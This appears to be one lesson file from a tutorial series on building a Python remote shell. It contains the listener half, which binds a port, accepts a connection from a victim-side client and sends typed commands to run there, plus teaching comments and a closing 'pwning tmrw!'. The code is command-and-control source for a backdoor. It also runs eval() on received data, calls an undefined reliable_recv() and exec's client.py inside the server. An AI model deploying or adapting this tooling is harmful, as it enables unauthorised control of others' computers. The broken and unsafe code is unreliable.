# Day 10 - Private shell commands (COMMAND PROMPT)
# 1     We have successfully created the shell on the last lecture. Now we are going to create the commands for the shell function.

import socket
import json
import subprocess # 2
import os # 2

def ip_address():
    global server_ip
    serv_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv_ip.connect(("8.8.8.8", 80))
    server_ip = serv_ip.getsockname()[0]
    serv_ip.close()
    return server_ip

#########################

server_ip = ip_address() 
server_port = 5555 

#########################

def json_send(data):
    jsondata = json.dumps(data)
    client.send(jsondata.encode())

def json_recv(size=1024):
    data = ''
    while True:
        try:
            data += client.recv(size).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def message_send(string, size=8):
    no_str = False
    if type(string) != str:
        string =str(string)
        no_str = True
    body = string.encode()
    length = len(body)
    header = str(length).encode()
    header += b' ' * (size - len(header))
    client.send(header)
    client.send(body)
    if no_str == True:
        client.send('T'.encode())
    else:
        client.send('F'.encode())

def message_recv(size=8):
    while True:
        header = client.recv(size).decode()
        if header:
            body_size = int(header)
            body = client.recv(body_size).decode()
            no_str = client.recv(1).decode()
            break
    if no_str == 'T':
        body = eval(body)
    return body
    

def shell():
    while True:
        command = input('Command Here: ')
        json_send(command)
        if command[:3] == 'cd ': # 2
            pass
        elif command == 'ls': # 3
            pass
        elif command == 'clear': # 4
            os.system('cls')
        elif command == 'quit':
            break
        else:
            result = reliable_recv()
            print(result)   


def connection():
    global server,client,ip
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((server_ip,server_port))
    server.listen(5)
    #####   DELETABLE   #####
    from pathlib import Path     
    exec(Path('client.py').read_text())
    #####   DELETABLE   #####
    client, ip = server.accept()
    shell() 


connection()


#########################

# 2     list slicing. if from index 0-3 are 'cd ', it will remained as pass.
#       commonly, we are giving the next command after cd, ie. 'cd Documents', 'cd my_folders', etc.
#       have you noticed that there were a white space after 'cd'?, we have a purpose why we made it [:3].
#       so that we can separate the next input that were written. ie. 'Downloads' from 'cd Downloads' or 'my_folder' from 'cd my_folder'
#       and then we can perform the command on the other side (client.py).
#       if you didn't understand. it's okay, you will definitely understand it later as we walk-trhough.
# 3     in this lecture, we are performing the commands for command prompt. since 'ls' is not a proper command in the CMD(command prompt), we can skip for 'ls' for now.
#       in the meantime, we can use the standard command for listing directories in CMD 'dir'
# 4     this time, if the machine detects 'clear' as the input, it will be performing os.system('cls')
#       remember that clear is also not acceptable in CMD, and supposedly be performing these scripts in the CMD (command prompt).
#       .system() method is came from the os module. it will perform any given inputs like a normal terminal.
#########################

# pwning tmrw!